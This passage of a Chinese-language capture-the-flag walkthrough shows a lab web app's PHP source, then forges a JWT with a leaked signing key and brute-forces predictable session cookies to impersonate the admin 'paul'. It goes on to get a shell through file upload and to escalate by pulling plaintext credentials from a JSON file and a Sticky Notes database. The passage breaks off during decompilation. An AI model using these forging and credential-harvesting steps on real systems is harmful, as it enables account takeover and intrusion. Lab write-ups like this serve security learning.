class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//if user clicks on login</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$query</span> = <span class="string">&quot;SELECT username,position FROM users WHERE username=? LIMIT 1&quot;</span>;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$con</span>-&gt;prepare(<span class="variable">$query</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;get_result();</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_array(MYSQLI_ASSOC))&#123;</span><br><span class="line">            array_push(<span class="variable">$userdata</span>, <span class="variable">$row</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$userCount</span> = <span class="variable">$result</span>-&gt;num_rows;</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$userCount</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$password</span> = sha1(<span class="variable">$password</span>);</span><br><span class="line">            <span class="variable">$passwordQuery</span> = <span class="string">&quot;SELECT * FROM users WHERE password=? AND username=? LIMIT 1&quot;</span>;</span><br><span class="line">            <span class="variable">$stmt</span> = <span class="variable">$con</span>-&gt;prepare(<span class="variable">$passwordQuery</span>);</span><br><span class="line">            <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&#x27;ss&#x27;</span>, <span class="variable">$password</span>, <span class="variable">$username</span>);</span><br><span class="line">            <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">            <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;get_result();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="variable">$valid</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$stmt</span>-&gt;close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$valid</span>)&#123;</span><br><span class="line">            session_id(makesession(<span class="variable">$username</span>));</span><br><span class="line">            session_start();</span><br><span class="line"></span><br><span class="line">            <span class="variable">$secret_key</span> = <span class="string">&#x27;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&#x27;</span>;</span><br><span class="line">            <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">            <span class="variable">$payload</span> = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;data&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&quot;username&quot;</span> =&gt; <span class="variable">$username</span></span><br><span class="line">            ));</span><br><span class="line"></span><br><span class="line">            <span class="variable">$jwt</span> = JWT::encode(<span class="variable">$payload</span>, <span class="variable">$secret_key</span>, <span class="string">&#x27;HS256&#x27;</span>);</span><br><span class="line">            </span><br><span class="line">            setcookie(<span class="string">&quot;token&quot;</span>, <span class="variable">$jwt</span>, time() + (<span class="number">86400</span> * <span class="number">30</span>), <span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedIn&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$userdata</span>[<span class="number">0</span>][<span class="string">&#x27;position&#x27;</span>] == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] = <span class="string">&quot;Awaiting approval&quot;</span>;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] = <span class="variable">$userdata</span>[<span class="number">0</span>][<span class="string">&#x27;position&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            header(<span class="string">&quot;Location: /portal&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedIn&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable">$errors</span>[<span class="string">&#x27;valid&#x27;</span>] = <span class="string">&quot;Username or Password incorrect&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elseif</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable">$passwordConf</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwordConf&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$username</span>))&#123;</span><br><span class="line">            <span class="variable">$errors</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;Username Required&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">4</span>)&#123;</span><br><span class="line">            <span class="variable">$errors</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;Username must be at least 4 characters long&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">            <span class="variable">$errors</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&quot;Password Required&quot;</span>; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span> !== <span class="variable">$passwordConf</span>)&#123;</span><br><span class="line">            <span class="variable">$errors</span>[<span class="string">&#x27;passwordConf&#x27;</span>] = <span class="string">&quot;Passwords don&#x27;t match!&quot;</span>; </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$userQuery</span> = <span class="string">&quot;SELECT * FROM users WHERE username=? LIMIT 1&quot;</span>;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$con</span>-&gt;prepare(<span class="variable">$userQuery</span>);</span><br><span class="line">        <span class="variable">$stmt</span> -&gt;bind_param(<span class="string">&#x27;s&#x27;</span>,<span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;get_result();</span><br><span class="line">        <span class="variable">$userCount</span> = <span class="variable">$result</span>-&gt;num_rows;</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$userCount</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$errors</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;Username already exists&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(count(<span class="variable">$errors</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$password</span> = sha1(<span class="variable">$password</span>);</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO users(username, password, age, position) VALUES (?,?, 0, &#x27;&#x27;)&quot;</span>;</span><br><span class="line">            <span class="variable">$stmt</span> = <span class="variable">$con</span>-&gt;prepare(<span class="variable">$sql</span>);</span><br><span class="line">            <span class="variable">$stmt</span> -&gt;bind_param(<span class="string">&#x27;ss&#x27;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;execute())&#123;</span><br><span class="line">                <span class="variable">$user_id</span> = <span class="variable">$con</span>-&gt;insert_id;</span><br><span class="line">                header(<span class="string">&#x27;Location: login.php&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedIn&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">                <span class="variable">$errors</span>[<span class="string">&#x27;db_error&#x27;</span>]=<span class="string">&quot;Database error: failed to register&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>/portal/cookie.php</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $username  Username requesting session cookie</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string $session_cookie Returns the generated cookie</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@devteam</span></span></span><br><span class="line"><span class="comment"> * Please DO NOT use default PHPSESSID; our security team says they are predictable.</span></span><br><span class="line"><span class="comment"> * CHANGE SECOND PART OF MD5 KEY EVERY WEEK</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makesession</span>(<span class="params"><span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$max</span> = strlen(<span class="variable">$username</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="variable">$seed</span> = rand(<span class="number">0</span>, <span class="variable">$max</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&quot;s4lTy_stR1nG_&quot;</span>.<span class="variable">$username</span>[<span class="variable">$seed</span>].<span class="string">&quot;(!528.\/9890&quot;</span>;</span><br><span class="line">    <span class="variable">$session_cookie</span> = <span class="variable">$username</span>.md5(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$session_cookie</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>/portal/includes/fileController.php</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ret</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;../vendor/autoload.php&quot;</span>;</span><br><span class="line"><span class="keyword">use</span> \<span class="title">Firebase</span>\<span class="title">JWT</span>\<span class="title">JWT</span>;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable">$jwt</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$secret_key</span> = <span class="string">&#x27;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&#x27;</span>;</span><br><span class="line">    <span class="variable">$ret</span> = JWT::decode(<span class="variable">$jwt</span>, <span class="variable">$secret_key</span>, <span class="keyword">array</span>(<span class="string">&#x27;HS256&#x27;</span>));   </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$admins</span> = <span class="keyword">array</span>(<span class="string">&quot;paul&quot;</span>);</span><br><span class="line">    <span class="variable">$user</span> = validate()-&gt;data-&gt;username;</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$user</span>, <span class="variable">$admins</span>) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&quot;paul&quot;</span>)&#123;</span><br><span class="line">        error_reporting(E_ALL &amp; ~E_NOTICE);</span><br><span class="line">        <span class="variable">$uploads_dir</span> = <span class="string">&#x27;../uploads&#x27;</span>;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmp_name</span>, <span class="string">&quot;<span class="subst">$uploads_dir</span>/<span class="subst">$name</span>&quot;</span>))&#123;</span><br><span class="line">            <span class="variable">$ret</span> = <span class="string">&quot;Success. Have a great weekend!&quot;</span>;</span><br><span class="line">        &#125;     </span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$ret</span> = <span class="string">&quot;Missing file or title :(&quot;</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="string">&quot;Insufficient privileges. Contact admin or developer to upload code. Note: If you recently registered, please wait for one of our admins to approve it.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>/portal/php/files.php</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$LOGGED_IN</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] !== <span class="string">&quot;paul&quot;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ../index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedIn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$LOGGED_IN</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">require</span> <span class="string">&#x27;../db/db.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ../auth/login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>而且files.php存在一个上传功能<br />
以理一下攻击链</p>
<ul>
<li>fileController.php上传文件</li>
<li>要求得到<code>paul</code>的身份</li>
<li>生成<code>PHPSESSID</code>和<code>JWT</code></li>
</ul>
<p>对于<code>JWT</code><br />
我们已经得到了签名密钥</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token_dict = &#123;<span class="string">&quot;data&quot;</span>:&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;paul&quot;</span>&#125;&#125;</span><br><span class="line">headers = &#123;<span class="string">&quot;typ&quot;</span>:<span class="string">&quot;JWT&quot;</span>, <span class="string">&quot;alg&quot;</span>:<span class="string">&quot;HS256&quot;</span>&#125;</span><br><span class="line">jwt_token = jwt.encode(token_dict, <span class="string">&quot;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&quot;</span>, algorithm=<span class="string">&quot;HS256&quot;</span>, headers=headers).decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">print(jwt_token)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.4mJguG8tRd2z_feWJpmr_J3AdMeDPvW7GCK7cW7o0AI</span><br></pre></td></tr></table></figure>
<p>对于<code>PHPSESSID</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$num</span> = <span class="keyword">array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="string">&quot;paul&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$num</span> <span class="keyword">as</span> <span class="variable">$a</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$key</span> = <span class="string">&quot;s4lTy_stR1nG_&quot;</span>.<span class="variable">$username</span>[<span class="variable">$a</span>].<span class="string">&quot;(!528./9890&quot;</span>;</span><br><span class="line">        <span class="variable">$session_cookie</span> = <span class="variable">$username</span>.md5(<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$session_cookie</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">paula2a6a014d3bee04d7df8d5837d62e8c5</span><br><span class="line">paul61ff9d4aaefe6bdf45681678ba89ff9d</span><br><span class="line">paul8c8808867b53c49777fe5559164708c3</span><br><span class="line">paul47200b180ccd6835d25d034eeb6e6390</span><br></pre></td></tr></table></figure>
<p>最后得到的Cookie为</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.4mJguG8tRd2z_feWJpmr_J3AdMeDPvW7GCK7cW7o0AI; PHPSESSID=paul47200b180ccd6835d25d034eeb6e6390</span><br></pre></td></tr></table></figure>
<p>上传ZIP时修改文件名和文件内容即可GetShell</p>
<h2 id="权限提升-3"><a class="markdownIt-Anchor" href="#权限提升-3"></a> 权限提升</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData\juliette.json</span><br></pre></td></tr></table></figure>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">&quot;pizza&quot;</span> : <span class="string">&quot;margherita&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;size&quot;</span> : <span class="string">&quot;large&quot;</span>,	</span><br><span class="line">	<span class="attr">&quot;drink&quot;</span> : <span class="string">&quot;water&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;card&quot;</span> : <span class="string">&quot;VISA&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;PIN&quot;</span> : <span class="string">&quot;9890&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;alternate&quot;</span> : &#123;</span><br><span class="line">		<span class="attr">&quot;username&quot;</span> : <span class="string">&quot;juliette&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;password&quot;</span> : <span class="string">&quot;jUli901./())!&quot;</span>,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用凭证<code>juliette:jUli901./())!</code>登入ssh服务</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\Users\juliette\Desktop\user.txt</span><br><span class="line">c5d9d568c5fc21e0dc0c5819d16aad9f</span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span> C:\Users\juliette\Desktop\todo.html</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">html&#123;</span><br><span class="line">background:black;</span><br><span class="line">color:orange;</span><br><span class="line">&#125;</span><br><span class="line">table,th,td&#123;</span><br><span class="line">border:1px solid orange;</span><br><span class="line">padding:1em;</span><br><span class="line">border-collapse:collapse;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;table&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;th&gt;Task&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;Status&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;Reason&lt;/th&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;Configure firewall <span class="keyword">for</span> port 22 and 445&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;Not started&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;Unauthorized access might be possible&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager&lt;/td&gt;   </span><br><span class="line">            &lt;td&gt;In progress&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;It stores passwords <span class="keyword">in</span> plain text&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;Add new features to password manager&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;Not started&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;To get promoted, hopefully lol&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>寻找密码存储文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dir C:\Users\juliette\Documents</span><br><span class="line"></span><br><span class="line">11/29/2020  04:10 AM             4,096 plum.sqlite</span><br><span class="line">01/15/2021  05:10 PM            32,768 plum.sqlite-shm</span><br><span class="line">01/15/2021  05:10 PM           329,632 plum.sqlite-wal</span><br></pre></td></tr></table></figure>
<p>复制到本地使用sqlite访问</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sqlite3 plum.sqlite </span><br><span class="line">sqlite&gt; .tables</span><br><span class="line">Media           Stroke          SyncState       User          </span><br><span class="line">Note            StrokeMetadata  UpgradedNote  </span><br><span class="line">sqlite&gt; select * from Note;</span><br><span class="line">\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!</span><br><span class="line">\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g</span><br><span class="line">\id=48924119-7212-4b01-9e0f-ae6d678d49b2 administrator: [MOVED]|ManagedPosition=|1|0||Yellow|0|||||||0c32c3d8-7c60-48ae-939e-798df198cfe7|8e814e57-9d28-4288-961c-31c806338c5b|637423162765765332||637423163995607122</span><br></pre></td></tr></table></figure>
<p>得到凭证<code>development:fN3)sN5Ee@g</code><br />
登入ssh服务</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Development</span><br><span class="line"></span><br><span class="line">11/29/2020  04:11 AM            18,312 Krypter_Linux</span><br></pre></td></tr></table></figure>
<p>IDA反编译</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 